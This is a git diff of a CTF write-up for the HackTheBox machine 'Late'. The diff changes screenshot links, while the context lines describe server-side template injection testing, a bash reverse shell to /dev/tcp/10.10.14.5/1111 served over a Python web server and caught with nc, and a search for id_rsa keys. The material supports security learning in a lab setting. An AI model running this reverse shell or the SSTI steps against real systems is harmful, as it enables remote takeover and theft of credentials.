@@ -9,28 +9,28 @@ Nutzt Template-Engine --> SSTI?
 If it throws an error ssti is succussfull
 How to: grab screen area with payload and save it (ssti-cobalt.png).
 ![](ssti-cobalt-polyglot.png)
-![](https://github.com/xenotim/CTF/blob/main/Late/screenshots/images.late.htb-upload%20image.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Late/screenshots/images.late.htb-upload%20image.png)
 
 Result:
-![](https://github.com/xenotim/CTF/blob/main/Late/screenshots/ssti-polyglot-response.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Late/screenshots/ssti-polyglot-response.png)
 
 SSTI payload was succusfull! --> throws error!
 
 Test: {{7*7}} --> 49 if successfull
-![](https://github.com/xenotim/CTF/blob/main/Late/screenshots/ssti-77.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Late/screenshots/ssti-77.png)
 
 Result: 49 --> injectable
-![](https://github.com/xenotim/CTF/blob/main/Late/screenshots/ssti-77-result.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Late/screenshots/ssti-77-result.png)
 
 SSTI remote commands from: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
-![](https://github.com/xenotim/CTF/blob/main/Late/screenshots/ssti%20payload%20rce.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Late/screenshots/ssti%20payload%20rce.png)
 
 ## Result
 ![](ssti id.png)
 # getting shell
 
 payload:
-![](https://github.com/xenotim/CTF/blob/main/Late/screenshots/ssti%20reverse%20shell.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Late/screenshots/ssti%20reverse%20shell.png)
 
 make dir www with index.html file:
 ````
@@ -41,7 +41,7 @@ bash -i >& /dev/tcp/10.10.14.5/1111 0>&1
 make python http.server on port 80 in the www folder
 ![](python3 http server on port 80.png)
 nc listen on port 1111
-![](https://github.com/xenotim/CTF/blob/main/Late/screenshots/nc%20shell.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Late/screenshots/nc%20shell.png)
 
 look for id_rsa file
 ````
